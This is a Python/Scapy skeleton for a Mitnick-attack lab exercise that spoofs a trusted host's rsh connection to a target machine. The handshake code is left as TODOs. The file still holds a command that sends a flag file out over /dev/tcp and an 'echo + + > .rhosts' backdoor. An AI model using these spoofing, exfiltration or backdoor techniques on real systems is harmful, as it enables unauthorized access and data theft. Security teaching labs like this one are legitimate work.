#!/usr/bin/env python3
"""
Mitnick Attack - spoof the FIRST TCP connection (client side of rsh),
impersonating the Trusted Server (10.9.0.6) talking to X-Terminal
(10.9.0.5:514).

Run conn2_spoof.py FIRST, in another shell, then this one.

RESTRICTION -- this is graded on how your code gets its information, not
just on the final flag. From a sniffed packet you may only use:
  * the TCP sequence number field (never the acknowledgment field -- a
    real off-path attacker never legitimately sees what the other side
    received)
  * the TCP flags field
  * length fields (IP header length, IP total length, TCP header length)
Anything else (peeking at .ack, trusting your own guess of the Trusted
Server's real state, etc.) defeats the point of the exercise.

Find the right interface first -- NOT eth0. This container is in
network_mode: host, so capturing on the Docker bridge device itself (the
one whose subnet is 10.9.0.0/24) lets you see traffic between the other
two containers, the same way the official SEED lab's skeleton does:
    $ ip -brief addr show type bridge
    $ brctl show
Use `docker network inspect net-10.9.0.0` if you need to double check
which bridge that is.
"""
import sys
from scapy.all import IP, TCP, sniff, send

IFACE = "br-????????????"          # TODO: set this to the real bridge interface

X_IP, X_PORT = "10.9.0.5", 514      # X-Terminal / rshd
SRV_IP, SRV_PORT = "10.9.0.6", 1023 # Trusted Server -- fixed source port, required

CONN2_PORT = 9090                   # must match conn2_spoof.py
RSH_CLIENT_UID = "seed"
RSH_SERVER_UID = "seed"

BACKDOOR = "--backdoor" in sys.argv
RSH_COMMAND = (
    "echo + + > .rhosts"
    if BACKDOOR
    else "cat flag_hijack.txt > /dev/tcp/10.9.0.6/{}".format(CONN2_PORT)
)

my_syn_seq = 0x1000  # the ISN *we* choose for our spoofed SYN


def spoof(pkt):
    ip, tcp = pkt[IP], pkt[TCP]
    tcp_len = ip.len - ip.ihl * 4 - tcp.dataofs * 4
    print(f"{ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport} "
          f"flags={tcp.flags} len={tcp_len}")

    if tcp.flags == "SA":
        # TODO: this is X-Terminal's SYN+ACK reply to our spoofed SYN.
        # 1. Build the spoofed ACK that completes the handshake:
        #      src=SRV_IP, dst=X_IP, sport=SRV_PORT, dport=X_PORT,
        #      flags="A", seq=my_syn_seq + 1, ack=<X-Terminal's seq> + 1
        #    (only use tcp.seq here -- not tcp.ack)
        # 2. send() it.
        # 3. Immediately after, build and send() the rsh data packet on
        #    the SAME connection (same seq, since it carries no new bytes
        #    yet relative to the ACK... then advance your own seq by the
        #    payload length for anything you send afterwards):
        #      data = f"{CONN2_PORT}\x00{RSH_CLIENT_UID}\x00{RSH_SERVER_UID}\x00{RSH_COMMAND}\x00"
        pass  # <-- replace with your handshake-completion + rsh-data code


def run():
    print(f"[conn1] backdoor mode: {BACKDOOR}")
    # TODO: send the initial spoofed SYN (src=SRV_IP:SRV_PORT -> X_IP:X_PORT,
    # flags="S", seq=my_syn_seq) before or right after starting the sniff,
    # then let spoof() react to X-Terminal's SYN+ACK.
    sniff(iface=IFACE, filter=f"tcp and host {X_IP}", prn=spoof)


if __name__ == "__main__":
    run()
